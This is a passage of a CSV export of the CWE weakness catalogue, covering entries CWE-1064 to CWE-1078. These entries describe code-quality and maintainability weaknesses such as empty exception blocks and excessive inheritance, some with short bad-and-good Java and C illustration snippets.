	 While the interpretation of ""large number of parameters."" may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Invokable Control Element with Signature Containing an Excessive Number of Parameters"", ""cwe_id"": ""CWE-1064"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a function, subroutine, or method whose signature has an unnecessarily large number of\n\t\t\t\t\tparameters/arguments."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t While the interpretation of \""large number of parameters.\"" may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.""}"
"CWE-1065","Runtime Resource Management Control Element in a Component Built to Run on Application Servers","The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server.","This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Runtime Resource Management Control Element in a Component Built to Run on Application Servers"", ""cwe_id"": ""CWE-1065"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses deployed components from application servers, but it also uses low-level functions/methods for management of resources, instead of the API provided by the application server."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1066","Missing Serialization Control Element","The product contains a serializable data element that does not
					have an associated serialization method.","This issue can prevent the product from running reliably, e.g. by triggering an exception.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
	 As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Missing Serialization Control Element"", ""cwe_id"": ""CWE-1066"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a serializable data element that does not\n\t\t\t\t\thave an associated serialization method."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably, e.g. by triggering an exception.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\t As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.""}"
"CWE-1067","Excessive Execution of Sequential Searches of Data Resource","The product contains a data query against an SQL table or view
					that is configured in a way that does not utilize an index and may cause
					sequential searches to be performed.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Excessive Execution of Sequential Searches of Data Resource"", ""cwe_id"": ""CWE-1067"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a data query against an SQL table or view\n\t\t\t\t\tthat is configured in a way that does not utilize an index and may cause\n\t\t\t\t\tsequential searches to be performed."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.""}"
"CWE-1068","Inconsistency Between Implementation and Documented Design","The implementation of the product is not consistent with the
					design as described within the relevant documentation.","This issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Inconsistency Between Implementation and Documented Design"", ""cwe_id"": ""CWE-1068"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The implementation of the product is not consistent with the\n\t\t\t\t\tdesign as described within the relevant documentation."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1069","Empty Exception Block","An invokable code block contains an exception handling block that does not contain any code, i.e. is empty.","When an exception handling block (such as a Catch and Finally block) is used, but that block is empty, this can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""For every exception block add code that handles the specific exception in the way intended by the application."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                        }\n                     }\n                  }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                           log.error(\""Divided by zero detected, setting to -1.\"");\n                           c = -1;\n                        }\n                     }\n                  }"", ""language"": ""Good""}]}]","","{""name"": ""Empty Exception Block"", ""cwe_id"": ""CWE-1069"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                        }\n                     }\n                  }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                           log.error(\""Divided by zero detected, setting to -1.\"");\n                           c = -1;\n                        }\n                     }\n                  }"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""An invokable code block contains an exception handling block that does not contain any code, i.e. is empty."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""For every exception block add code that handles the specific exception in the way intended by the application."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""For every exception block add code that handles the specific exception in the way intended by the application."", ""detection_methods"": [], ""extended_description"": ""When an exception handling block (such as a Catch and Finally block) is used, but that block is empty, this can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-107","Struts: Unused Validation Form","An unused validation form indicates that validation logic is not up-to-date.","It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Quality Degradation""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Remove the unused Validation Form from the validation.xml file."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration form\n                           private String name;private String address;private String city;private String state;private String zipcode;\n                           // no longer using the phone form field\n                           \n                           \n                           // private String phone;\n                           private String email;\n                           public RegistrationForm() {super();}\n                           \n                           // getter and setter methods for private variables\n                           ...}"", ""language"": ""Bad""}, {""code"": ""<form-validation><formset><form name=\""RegistrationForm\""><field property=\""name\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.name\""/></field><field property=\""address\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.address\""/></field><field property=\""city\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.city\""/></field><field property=\""state\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.state\""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=\""zipcode\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.zipcode\""/><var><var-name>mask</var-name><var-value>\\d{5}</var-value></var></field><field property=\""phone\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.phone\""/><var><var-name>mask</var-name><var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value></var></field><field property=\""email\"" depends=\""required,email\""><arg position=\""0\"" key=\""prompt.email\""/></field></form></formset></form-validation>"", ""language"": ""Bad""}]}]","","{""name"": ""Struts: Unused Validation Form"", ""cwe_id"": ""CWE-107"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration form\n                           private String name;private String address;private String city;private String state;private String zipcode;\n                           // no longer using the phone form field\n                           \n                           \n                           // private String phone;\n                           private String email;\n                           public RegistrationForm() {super();}\n                           \n                           // getter and setter methods for private variables\n                           ...}"", ""language"": ""Bad""}, {""code"": ""<form-validation><formset><form name=\""RegistrationForm\""><field property=\""name\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.name\""/></field><field property=\""address\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.address\""/></field><field property=\""city\"" depends=\""required\""><arg position=\""0\"" key=\""prompt.city\""/></field><field property=\""state\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.state\""/><var><var-name>mask</var-name><var-value>[a-zA-Z]{2}</var-value></var></field><field property=\""zipcode\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.zipcode\""/><var><var-name>mask</var-name><var-value>\\d{5}</var-value></var></field><field property=\""phone\"" depends=\""required,mask\""><arg position=\""0\"" key=\""prompt.phone\""/><var><var-name>mask</var-name><var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value></var></field><field property=\""email\"" depends=\""required,email\""><arg position=\""0\"" key=\""prompt.email\""/></field></form></formset></form-validation>"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""An unused validation form indicates that validation logic is not up-to-date."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Remove the unused Validation Form from the validation.xml file."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Quality Degradation""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Remove the unused Validation Form from the validation.xml file."", ""detection_methods"": [], ""extended_description"": ""It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.""}"
"CWE-1070","Serializable Data Element Containing non-Serializable Item Elements","The product contains a serializable, storable data element such as a field or member,
					but the data element contains member elements that are not
					serializable.","This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
 	 As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Serializable Data Element Containing non-Serializable Item Elements"", ""cwe_id"": ""CWE-1070"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a serializable, storable data element such as a field or member,\n\t\t\t\t\tbut the data element contains member elements that are not\n\t\t\t\t\tserializable."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n \t As examples, the serializable nature of a data element comes from a serializable SerializableAttribute attribute in .NET and the inheritance from the java.io.Serializable interface in Java.""}"
"CWE-1071","Empty Code Block","The source code contains a block that does not contain any code, i.e., the block is empty.","Empty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc.  While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc.  For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                        }\n                     }\n                  }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                           log.error(\""Divided by zero detected, setting to -1.\"");\n                           c = -1;\n                        }\n                     }\n                  }"", ""language"": ""Good""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""synchronized(this) { }"", ""language"": ""Bad""}, {""code"": ""public void setID(int ID){synchronized(this){this.ID = ID;}}"", ""language"": ""Good""}]}]","","{""name"": ""Empty Code Block"", ""cwe_id"": ""CWE-1071"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                        }\n                     }\n                  }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                     public static void main(String[] args) {\n                        int a = 1;\n                        int b = 0;\n                        int c = 0;\n                        try {\n                           c = a / b;\n                        } catch(ArithmeticException ae) {\n                           log.error(\""Divided by zero detected, setting to -1.\"");\n                           c = -1;\n                        }\n                     }\n                  }"", ""language"": ""Good""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""synchronized(this) { }"", ""language"": ""Bad""}, {""code"": ""public void setID(int ID){synchronized(this){this.ID = ID;}}"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code contains a block that does not contain any code, i.e., the block is empty."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""Empty code blocks can occur in the bodies of conditionals, function or method definitions, exception handlers, etc.  While an empty code block might be intentional, it might also indicate incomplete implementation, accidental code deletion, unexpected macro expansion, etc.  For some programming languages and constructs, an empty block might be allowed by the syntax, but the lack of any behavior within the block might violate a convention or API in such a way that it is an error.""}"
"CWE-1072","Data Resource Access without Use of Connection Pooling","The product accesses a data resource through a database without using a
					connection pooling capability.","This issue can make the product perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Data Resource Access without Use of Connection Pooling"", ""cwe_id"": ""CWE-1072"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product accesses a data resource through a database without using a\n\t\t\t\t\tconnection pooling capability."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly, as connection pools allow connections to be reused without the overhead and time consumption of opening and closing a new connection.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.""}"
"CWE-1073","Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses","The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
	 While the interpretation of ""large number of data accesses/queries"" may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Non-SQL Invokable Control Element with Excessive Number of Data Resource Accesses"", ""cwe_id"": ""CWE-1073"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a client with a function or method that contains a large number of data accesses/queries that are sent through a data manager, i.e., does not use efficient database capabilities."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\t While the interpretation of \""large number of data accesses/queries\"" may vary for each product or developer, CISQ recommends a default maximum of 2 data accesses per function/method.""}"
"CWE-1074","Class with Excessively Deep Inheritance","A class has an inheritance level that is too high, i.e., it
					has a large number of parent classes.","This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
	 While the interpretation of ""large number of parent classes"" may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Class with Excessively Deep Inheritance"", ""cwe_id"": ""CWE-1074"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A class has an inheritance level that is too high, i.e., it\n\t\t\t\t\thas a large number of parent classes."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t While the interpretation of \""large number of parent classes\"" may vary for each product or developer, CISQ recommends a default maximum of 7 parent classes.""}"
"CWE-1075","Unconditional Control Flow Transfer outside of Switch Block","The product performs unconditional control transfer (such as a
					""goto"") in code outside of a branching structure such as a switch
					block.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Unconditional Control Flow Transfer outside of Switch Block"", ""cwe_id"": ""CWE-1075"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product performs unconditional control transfer (such as a\n\t\t\t\t\t\""goto\"") in code outside of a branching structure such as a switch\n\t\t\t\t\tblock."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1076","Insufficient Adherence to Expected Conventions","The product's architecture, source code, design, documentation,
					or other artifact does not follow required conventions.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Insufficient Adherence to Expected Conventions"", ""cwe_id"": ""CWE-1076"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The product's architecture, source code, design, documentation,\n\t\t\t\t\tor other artifact does not follow required conventions."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1077","Floating Point Comparison with Incorrect Operator","The code performs a comparison such as an
        equality test between two float (floating point) values, but
        it uses comparison operators that do not account for the
        possibility of loss of precision.","Numeric calculation using floating point values
	   can generate imprecise results because of rounding errors.
	   As a result, two different calculations might generate
	   numbers that are mathematically equal, but have slightly
	   different bit representations that do not translate to the
	   same mathematically-equal values.  As a result, an equality
	   test or other comparison might produce unexpected
	   results.
	   This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Floating Point Comparison with Incorrect Operator"", ""cwe_id"": ""CWE-1077"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""The code performs a comparison such as an\n        equality test between two float (floating point) values, but\n        it uses comparison operators that do not account for the\n        possibility of loss of precision."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""Numeric calculation using floating point values\n\t   can generate imprecise results because of rounding errors.\n\t   As a result, two different calculations might generate\n\t   numbers that are mathematically equal, but have slightly\n\t   different bit representations that do not translate to the\n\t   same mathematically-equal values.  As a result, an equality\n\t   test or other comparison might produce unexpected\n\t   results.\n\t   This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1078","Inappropriate Source Code Style or Formatting","The source code does not follow
				desired style or formatting for indentation, white
				space, comments, etc.","","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""char buffer[1024];...fgets(buffer, 1024, stdin);"", ""language"": ""Bad""}, {""code"": ""enum { MAX_BUFFER_SIZE = 1024 };...char buffer[MAX_BUFFER_SIZE];...fgets(buffer, MAX_BUFFER_SIZE, stdin);"", ""language"": ""Good""}]}]","","{""name"": ""Inappropriate Source Code Style or Formatting"", ""cwe_id"": ""CWE-1078"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""char buffer[1024];...fgets(buffer, 1024, stdin);"", ""language"": ""Bad""}, {""code"": ""enum { MAX_BUFFER_SIZE = 1024 };...char buffer[MAX_BUFFER_SIZE];...fgets(buffer, MAX_BUFFER_SIZE, stdin);"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The source code does not follow\n\t\t\t\tdesired style or formatting for indentation, white\n\t\t\t\tspace, comments, etc."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": """"}"
